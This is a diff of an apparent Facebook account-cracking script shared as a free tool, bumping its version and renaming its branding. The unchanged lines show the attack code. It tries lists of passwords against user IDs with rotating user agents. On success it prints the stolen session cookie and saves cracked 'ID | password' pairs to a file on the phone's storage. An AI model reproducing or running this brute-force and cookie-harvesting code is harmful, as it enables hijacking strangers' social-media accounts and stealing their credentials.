@@ -129,14 +129,14 @@ logo=("""
    
 \33[33;1m███████  █████  ██   ██ ██ ██████  ██    ██ ██      
    \33[33;1m███  ██   ██ ██   ██ ██ ██   ██ ██    ██ ██      
-  \33[33;1m███   ███████ ███████ ██ ██████  ██    ██ ██ \33[31;1mP      
- \33[33;1m███    ██   ██ ██   ██ ██ ██   ██ ██    ██ ██ \33[31;1mR     
+  \33[33;1m███   ███████ ███████ ██ ██████  ██    ██ ██            \33[31;1mP      
+ \33[33;1m███    ██   ██ ██   ██ ██ ██   ██ ██    ██ ██                           \33[31;1mR     
 \33[33;1m███████ ██   ██ ██   ██ ██ ██   ██  ██████  ███████ \33[31;1mO                                                                            
 \33[32;1m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐
  [•] Author   ➤ Md Jibon Sarker
  [•] Facebook ➤ Md Jibon Islam
  [•] Tool     ➤ Free
- [•] Version  ➤ 0.2
+ [•] Version  ➤ 0.3
 \33[32;1m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘""")
 def cek_apk(session,coki):
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
@@ -256,7 +256,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mJIBON-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mZ,J-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -298,10 +298,10 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [JIBON-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [Z,J-OK] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m=[😈]=COOKIE : '+coki)
                 ok.append(cid)
-                open('/sdcard/jibon-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/Z.J-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
